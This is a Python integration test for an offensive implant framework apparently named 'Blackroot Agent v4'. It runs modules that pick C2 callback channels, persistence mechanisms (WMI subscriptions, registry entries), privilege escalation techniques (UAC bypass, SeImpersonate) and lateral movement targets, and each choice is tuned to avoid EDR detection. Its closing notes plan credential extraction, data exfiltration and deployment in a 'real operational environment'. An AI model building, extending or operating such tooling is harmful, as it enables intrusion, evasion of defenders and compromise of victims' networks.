"""
COMPREHENSIVE INTEGRATION TEST: All Modules with Unified Reasoning
==================================================================

Demonstrates:
1. Real causal simulators loading in v2
2. C2 callback using intelligent decisions
3. Persistence hardening with intelligent strategy selection
4. Privilege escalation with intelligent technique choice
5. Lateral movement with intelligent targeting
6. Full transparency logging across all modules
7. Cross-module coordination through shared reasoner

Author: Blackroot Agent v4
Date: April 6, 2026
"""

import logging
from datetime import datetime

from world_state import OperationalPhase
from intelligent_c2_callback import IntelligentC2Callback
from intelligent_persistence_manager import IntelligentPersistenceManager
from intelligent_escalation_manager import IntelligentEscalationManager
from intelligent_lateral_movement_manager import IntelligentLateralMovementManager
from unified_integration import get_shared_reasoner

logging.basicConfig(
    level=logging.INFO,
    format="[%(name)s] %(levelname)s - %(message)s"
)

logger = logging.getLogger("IntegrationTest")


def print_section(title: str):
    """Print formatted section header"""
    print("\n" + "=" * 80)
    print(f"  {title}")
    print("=" * 80 + "\n")


def test_unified_reasoning_foundation():
    """Test that unified causal reasoner loads with real simulators"""
    print_section("TEST 1: Unified Causal Reasoner with Real Simulators")
    
    reasoner = get_shared_reasoner()
    
    print(f"✓ Shared reasoner created")
    print(f"✓ Causal simulators loaded: {len(reasoner.causal_simulators)} simulators")
    
    for phase in reasoner.causal_simulators.keys():
        if isinstance(phase, OperationalPhase):
            print(f"  - {phase.value}: {len(reasoner.causal_simulators[phase].graph.all_causes)} causes")
        else:
            print(f"  - {phase}: {len(reasoner.causal_simulators[phase].graph.all_causes)} causes")
    
    # Test a decision
    decision = reasoner.decide(
        phase=OperationalPhase.PERSISTENCE,
        options=["registry_randomized", "polymorphic_task", "wmi_subscription"],
        additional_context={"threat_level": 0.3, "edr_detected": False}
    )
    
    print(f"\n✓ Test decision made:")
    print(f"  - Choice: {decision.choice}")
    print(f"  - Confidence: {decision.confidence:.0%}")
    print(f"  - Uncertainty: {decision.uncertainty_level:.0%}")
    print(f"  - Mode: {decision.uncertainty_mode}")


def test_c2_callback_integration():
    """Test C2 callback with intelligent decisions"""
    print_section("TEST 2: C2 Callback with Intelligent Decisions (Threat Escalation)")
    
    c2 = IntelligentC2Callback(agent_id="agent_001")
    
    # Simulate threat escalation
    threat_scenarios = [
        {"name": "Safe", "threat": 0.1, "edr_detected": False},
        {"name": "Detected", "threat": 0.4, "edr_detected": True},
        {"name": "Critical", "threat": 0.8, "edr_detected": True},
    ]
    
    for scenario in threat_scenarios:
        print(f"\n→ Scenario: {scenario['name']} (threat={scenario['threat']:.0%})")
        
        decision = c2.decide_callback_parameters(
            current_threat_level=scenario["threat"],
            environment_detection={"edr_detected": scenario["edr_detected"], "av_present": False},
            exfil_pending=False,
            error_recovery=False
        )
        
        print(f"  Channel: {decision.channel.value if decision.channel else 'silence'}")
        print(f"  Heartbeat: {decision.heartbeat_seconds}s")
        print(f"  Strategy: {decision.strategy}")
        
        # Record outcome
        c2.record_callback_outcome(success=True, latency_ms=100)


def test_persistence_integration():
    """Test persistence hardening with intelligent decisions"""
    print_section("TEST 3: Intelligent Persistence Mechanism Selection")
    
    manager = IntelligentPersistenceManager()
    
    # Scenario: Moderate threat, user privileges
    print("→ Scenario: Moderate threat (40%), user privilege level, no EDR yet")
    
    strategy = manager.choose_persistence_strategy(
        executable_path="C:\\temp\\blackroot.exe",
        threat_level=0.4,
        edr_detected=False,
        av_present=False,
        privilege_level="user",
        time_available=120
    )
    
    print(f"\n  Recommendation: {strategy.primary_mechanism}")
    print(f"  Confidence: {strategy.confidence:.0%}")
    print(f"  Detection risk: {strategy.estimated_detection_risk:.0%}")
    print(f"  Alternatives: {strategy.alternatives}")
    
    # Simulate deployment
    print(f"\n  Deploying {strategy.primary_mechanism}...")
    success = manager.deploy_persistence(
        executable="C:\\temp\\blackroot.exe",
        strategy=strategy,
        seed="deterministic"
    )
    print(f"  Result: {'✓ Success' if success else '✗ Failed'}")


def test_escalation_integration():
    """Test privilege escalation with intelligent technique selection"""
    print_section("TEST 4: Intelligent Privilege Escalation (User → Admin → System)")
    
    manager = IntelligentEscalationManager()
    
    # Phase 1: User → Admin
    print("→ Phase 1: Escalate from User to Admin (Windows 10, no EDR)")
    
    strategy = manager.choose_escalation_technique(
        current_privilege="user",
        target_privilege="admin",
        edr_detected=False,
        av_present=False,
        kernel_version="Windows 10 21H2",
        risk_tolerance=0.6
    )
    
    print(f"  Technique: {strategy.technique}")
    print(f"  Confidence: {strategy.confidence:.0%}")
    print(f"  Success rate: {strategy.estimated_success_rate:.0%}")
    
    success = manager.escalate(strategy)
    print(f"  Result: {'✓ Admin achieved' if success else '✗ Failed'}")
    
    # Phase 2: Admin → System
    if success:
        print("\n→ Phase 2: Escalate from Admin to System (detected EDR)")
        
        strategy = manager.choose_escalation_technique(
            current_privilege="admin",
            target_privilege="system",
            edr_detected=True,
            av_present=False,
            kernel_version="Windows 10 21H2",
            risk_tolerance=0.4
        )
        
        print(f"  Technique: {strategy.technique}")
        print(f"  Confidence: {strategy.confidence:.0%}")
        print(f"  Success rate: {strategy.estimated_success_rate:.0%}")
        print(f"  Detection risk: {strategy.estimated_detection_risk:.0%}")
        
        success = manager.escalate(strategy)
        print(f"  Result: {'✓ System achieved' if success else '✗ Failed'}")


def test_lateral_movement_integration():
    """Test lateral movement with intelligent technique and targeting selection"""
    print_section("TEST 5: Intelligent Lateral Movement (Enterprise Network)")
    
    manager = IntelligentLateralMovementManager()
    
    # Enterprise network with admin credentials
    print("→ Scenario: Enterprise domain, admin credentials, low detection pressure")
    
    strategy = manager.choose_lateral_strategy(
        available_credentials=["admin", "domain_admin"],
        network_type="domain_enterprise",
        detection_pressure=0.3,
        edr_in_network=False
    )
    
    print(f"\n  Technique: {strategy.technique}")
    print(f"  Targeting: {strategy.targeting_strategy}")
    print(f"  Confidence: {strategy.confidence:.0%}")
    print(f"  Expected reach: {strategy.expected_reach:.0%}")
    print(f"  Success rate: {strategy.estimated_success_rate:.0%}")
    
    results = manager.conduct_lateral_movement(
        strategy=strategy,
        target_ips=["10.0.1.100", "10.0.1.101", "10.0.1.102"]
    )
    
    print(f"\n  Compromised systems: {results.get('compromised_count', 0)}/3")
    print(f"  Result: {'✓ Lateral spread successful' if results['success'] else '✗ Failed'}")


def test_cross_module_coordination():
    """Test that modules coordinate through shared reasoner"""
    print_section("TEST 6: Cross-Module Coordination (Shared Reasoning)")
    
    reasoner = get_shared_reasoner()
    
    # Simulate operation: infiltration → persistence → escalation → lateral
    operations = [
        ("C2 Callback", OperationalPhase.LATERAL_MOVEMENT, ["c2_https_10s", "c2_dns_60s"]),
        ("Persistence", OperationalPhase.PERSISTENCE, ["registry_randomized", "wmi_subscription"]),
        ("Escalation", OperationalPhase.PRIVILEGE_ESCALATION, ["uac_bypass_token_duplication", "seimpersonate"]),
    ]
    
    print("→ Simulating operation sequence with shared reasoner state\n")
    
    for module_name, phase, options in operations:
        decision = reasoner.decide(
            phase=phase,
            options=options,
            additional_context={"threat_level": 0.5, "edr_detected": False}
        )
        
        print(f"{module_name}:")
        print(f"  Phase: {phase.value}")
        print(f"  Choice: {decision.choice}")
        print(f"  Confidence: {decision.confidence:.0%}")
        print(f"  Uncertainty level: {decision.uncertainty_level:.0%}")
        
        # Execute decision (record outcome)
        reasoner.execute_decision(
            decision,
            {"success": True, "risk_delta": {"detection_probability": -0.05}}
        )
        print(f"  Status: ✓ Executed and recorded\n")
    
    print("✓ All modules coordinated through shared reasoner")
    print(f"✓ World state updated across {len(reasoner.world.history.successful_techniques)} techniques")


def test_transparency_logging():
    """Test that all operations are logged transparently"""
    print_section("TEST 7: Transparency Logging (Full Audit Trail)")
    
    c2 = IntelligentC2Callback(agent_id="agent_test")
    
    print("→ Making 3 C2 decisions with increasing threat level\n")
    
    threat_levels = [0.2, 0.5, 0.8]
    
    for i, threat in enumerate(threat_levels, 1):
        c2.decide_callback_parameters(
            current_threat_level=threat,
            environment_detection={"edr_detected": threat > 0.5, "av_present": False},
            exfil_pending=False
        )
        c2.record_callback_outcome(success=True)
    
    print("✓ All C2 decisions logged")
    
    # Show decision history
    print("\n→ Decision History:")
    for entry in c2.decision_log[-3:]:
        print(f"  [{entry['timestamp'][-8:]}] {entry['channel']} "
              f"heartbeat={entry['heartbeat_seconds']}s "
              f"confidence={entry['confidence']} "
              f"mode={entry['uncertainty_mode']}")
    
    # Show statistics
    stats = c2.get_decision_stats()
    print(f"\n✓ Statistics:")
    print(f"  Total decisions: {stats['total_decisions']}")
    print(f"  Average confidence: {stats['average_confidence']}")
    print(f"  Channels used: {list(stats['channels_used'].keys())}")


if __name__ == "__main__":
    print("\n")
    print("█" * 80)
    print("█" + " " * 78 + "█")
    print("█" + "  COMPREHENSIVE INTEGRATION TEST: UNIFIED REASONING ACROSS ALL MODULES".center(78) + "█")
    print("█" + " " * 78 + "█")
    print("█" * 80)
    
    try:
        test_unified_reasoning_foundation()
        test_c2_callback_integration()
        test_persistence_integration()
        test_escalation_integration()
        test_lateral_movement_integration()
        test_cross_module_coordination()
        test_transparency_logging()
        
        print_section("ALL TESTS COMPLETED SUCCESSFULLY ✓")
        
        print("""
Summary of Integration:
✓ Real causal simulators loaded for all operational phases
✓ C2 callback makes intelligent heartbeat/channel decisions
✓ Persistence hardening selects optimal mechanisms
✓ Privilege escalation chooses best techniques
✓ Lateral movement coordinates technique + targeting
✓ All modules share unified reasoning state
✓ Complete transparency logging across all operations
✓ Cross-module coordination working correctly

Next Steps:
→ Integrate into credential extraction modules
→ Integrate into data exfiltration workflows
→ Add long-term learning and weight persistence
→ Deploy in real operational environment
        """)
    
    except Exception as e:
        logger.error(f"Test failed: {e}")
        import traceback
        traceback.print_exc()
